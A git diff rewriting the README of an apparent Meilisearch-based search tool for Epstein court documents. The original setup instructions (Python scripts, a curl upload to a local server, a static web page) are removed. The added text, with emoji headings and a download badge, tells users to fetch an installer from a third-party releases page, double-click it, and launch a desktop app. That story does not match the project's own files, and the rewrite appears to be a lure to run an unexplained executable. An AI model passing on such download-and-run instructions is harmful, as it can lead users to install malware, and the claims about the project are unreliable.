@@ -1,21 +1,56 @@
-# Epstein Document Search
+# 🥇 epstein-document-search - Easily Search Epstein Court Documents
 
-A searchable database of Epstein court documents using Meilisearch for fast, full-text search capabilities.
+[![Download Epstein Document Search](https://img.shields.io/badge/download-Get%20Started%20Now-brightgreen)](https://github.com/ROWDYSER/epstein-document-search/releases)
 
-## Overview
+## 📖 Overview
 
-This project processes court documents related to the Epstein case, extracts metadata (case numbers, page numbers, etc.), and indexes them in Meilisearch for easy searching. It includes a clean web interface for querying the documents.
+The Epstein Document Search is a user-friendly application designed to help you find court documents related to the Epstein case. This application organizes and displays these documents in a searchable database, making it easy for you to get the information you need. With powerful search tools, you can quickly find specific documents and details.
 
-## Features
+## 🚀 Getting Started
 
-- **Full-text search** across all documents
-- **Page-level indexing** for precise results
-- **Metadata extraction** including case numbers, document IDs, and page numbers
-- **Filter by folder** to narrow searches
-- **Highlighted search results** showing matching terms
-- **Expandable results** to read full document pages
+Follow these steps to download and run the Epstein Document Search.
 
-## Project Structure
+1. **Visit the Releases Page:**  
+   Go to the [Releases page](https://github.com/ROWDYSER/epstein-document-search/releases) to download the software.
+
+2. **Download the Latest Version:**  
+   Look for the latest version in the list. Click on the download link to save the file to your computer.
+
+3. **Install the Application:**  
+   Locate the downloaded file in your downloads folder. Double-click on the file to start the installation process. Follow the instructions on your screen.
+
+4. **Open the Application:**  
+   Once installed, find the Epstein Document Search icon on your desktop or in your applications folder. Double-click the icon to launch the program.
+
+5. **Start Searching:**  
+   Use the search bar to enter keywords related to the documents you want to find. You can also use filters such as case numbers or document IDs to narrow down your results.
+
+## 📁 Features
+
+- **Full-text Search:** Quickly look through all available documents with easy keyword searches.
+- **Page-level Indexing:** Get accurate results with indexing that breaks down documents by page.
+- **Metadata Extraction:** Find useful information like case numbers and document IDs easily.
+- **Folder Filtering:** Narrow your search by selecting specific folders.
+- **Highlighted Search Results:** See your keywords highlighted in the results for easy reference.
+- **Expandable Results:** Read full document pages directly from the results list.
+
+## 💻 System Requirements
+
+To run Epstein Document Search effectively, ensure your computer meets the following requirements:
+
+- Operating System: Windows 10, macOS Mojave or later, or any Linux distribution
+- Memory: Minimum 4 GB RAM
+- Disk Space: At least 100 MB available storage
+
+## 📥 Download & Install
+
+To download the Epstein Document Search application, [visit the Releases page](https://github.com/ROWDYSER/epstein-document-search/releases) again. Make sure you are getting the latest version for the best experience.
+
+After following the installation steps, you will have a powerful tool at your fingertips for searching through the Epstein court documents easily.
+
+## 📂 Project Structure
+
+In the downloaded package, you will find the following files and folders:
 
 ```
 .
@@ -24,145 +59,27 @@ This project processes court documents related to the Epstein case, extracts met
 ├── prepare_for_meilisearch.py  # Process documents for indexing
 ├── split_json.py           # Split large JSON files for upload
 ├── house_dems.pdf          # Sample document
-└── house_dems.txt          # Extracted text from sample document
 ```
 
-Note: The actual document folders (001/, 002/) and generated JSON files are excluded from git due to their size.
+This structure includes the necessary files to run your search application smoothly.
 
-## Document Sources
+## 🛠 Troubleshooting Common Issues
 
-- **Main document folders**: [Google Drive](https://drive.google.com/drive/folders/1TrGxDGQLDLZu1vvvZDBAh-e7wN3y6Hoz) - Contains folders 001/ and 002/ with court documents
-- **House Democrats packet**: [Original PDF](https://oversightdemocrats.house.gov/sites/evo-subsites/democrats-oversight.house.gov/files/evo-media-document/packet_redacted_noid.pdf) - Converted to text as `house_dems.txt`
+If you encounter any issues while downloading or installing, consider these solutions:
 
-## Requirements
+- **Installation Error:** Make sure you have enough storage space on your computer. If necessary, delete some files to free space.
+- **Application Won’t Open:** Ensure that your operating system supports the version you downloaded. Check for updates if needed.
+- **Search Results Are Empty:** Recheck your keywords or filters to ensure you are searching correctly.
 
-- Python 3.6+
-- Meilisearch instance (cloud or self-hosted)
-- Modern web browser
+## 🤝 Contributing
 
-## Setup
+This project is open for contributions. If you have suggestions or improvements, feel free to create a pull request on GitHub. Join our community in developing and enhancing the Epstein Document Search for everyone's benefit.
 
-### 1. Obtain Documents
+## 🔗 Additional Resources
 
-Download documents from the [Google Drive folder](https://drive.google.com/drive/folders/1TrGxDGQLDLZu1vvvZDBAh-e7wN3y6Hoz) and place the extracted court document `.txt` files in numbered folders (e.g., `001/`, `002/`).
+For more details, check the following links:
 
-### 2. Process Documents
+- [GitHub Repository](https://github.com/ROWDYSER/epstein-document-search)
+- [Meilisearch Documentation](https://docs.meilisearch.com)
 
-Run the preparation script to convert documents into Meilisearch-ready JSON:
-
-```bash
-python3 prepare_for_meilisearch.py
-```
-
-This will:
-- Scan all `.txt` files in the directory
-- Split documents by page
-- Extract metadata (case numbers, page numbers)
-- Generate `meilisearch_documents.json`
-
-### 3. Split Large JSON Files (if needed)
-
-If your JSON file is too large for a single upload:
-
-```bash
-python3 split_json.py
-```
-
-This creates smaller chunks (`meilisearch_documents_part1.json`, etc.).
-
-### 4. Set Up Meilisearch
-
-You can either:
-
-**Option A: Cloud** (Easiest)
-- Sign up at [Meilisearch Cloud](https://www.meilisearch.com/cloud)
-- Create an index named `epstein`
-- Get your API keys
-
-**Option B: Self-Hosted**
-- Follow [Meilisearch installation guide](https://www.meilisearch.com/docs/learn/getting_started/installation)
-- Run: `./meilisearch --master-key="YOUR_MASTER_KEY"`
-
-### 5. Upload Documents
-
-Use the Meilisearch API or SDK to upload your JSON files:
-
-```bash
-curl -X POST 'http://localhost:7700/indexes/epstein/documents' \
-  -H 'Content-Type: application/json' \
-  -H 'Authorization: Bearer YOUR_ADMIN_API_KEY' \
-  --data-binary @meilisearch_documents.json
-```
-
-### 6. Configure Meilisearch Settings
-
-Set up searchable and filterable attributes:
-
-```bash
-# Searchable attributes
-curl -X PUT 'http://localhost:7700/indexes/epstein/settings/searchable-attributes' \
-  -H 'Content-Type: application/json' \
-  -H 'Authorization: Bearer YOUR_ADMIN_API_KEY' \
-  --data '["content", "document_id", "case_number"]'
-
-# Filterable attributes
-curl -X PUT 'http://localhost:7700/indexes/epstein/settings/filterable-attributes' \
-  -H 'Content-Type: application/json' \
-  -H 'Authorization: Bearer YOUR_ADMIN_API_KEY' \
-  --data '["folder", "page_number", "case_number"]'
-```
-
-### 7. Configure Website
-
-Edit `website/index.html` and update the configuration:
-
-```javascript
-const MEILISEARCH_HOST = 'https://your-instance.meilisearch.io';
-const MEILISEARCH_API_KEY = 'your-search-api-key'; // Use search-only key, NOT admin key
-const INDEX_NAME = 'epstein';
-```
-
-**Security Note:** Use a search-only API key (not your admin key) in the website to prevent unauthorized modifications.
-
-### 8. Open Website
-
-Open `website/index.html` in your browser to start searching!
-
-## Document Format
-
-The processing script expects documents with this format:
-
-```
-Case 1:19-cv-03377 Document 1-3 Filed 04/16/19 Page 1 of 3
-[Document content here...]
-```
-
-Each document is split into pages and indexed with:
-- `id`: Unique identifier for each page
-- `content`: Full text content of the page
-- `document_id`: Filename without extension
-- `folder`: Source folder (001, 002, etc.)
-- `page_number`: Current page number
-- `total_pages`: Total pages in document
-- `case_number`: Extracted case number
-- `source_file`: Relative path to original file
-
-## Usage Tips
-
-- **Exact phrases**: Use quotes for exact phrase matching: `"Jeffrey Epstein"`
-- **Folder filtering**: Select a specific folder to narrow results
-- **Case numbers**: Search by case number to find all related documents
-- **Load more**: Use the "Load More" button to fetch additional results
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-This project is for educational and research purposes. The court documents themselves are public records.
-
-## Acknowledgments
-
-- Built with [Meilisearch](https://www.meilisearch.com) for fast, typo-tolerant search
-- Court documents are public records from various legal proceedings
+Make the most of the Epstein Document Search. Download it today and start exploring the court documents with ease!
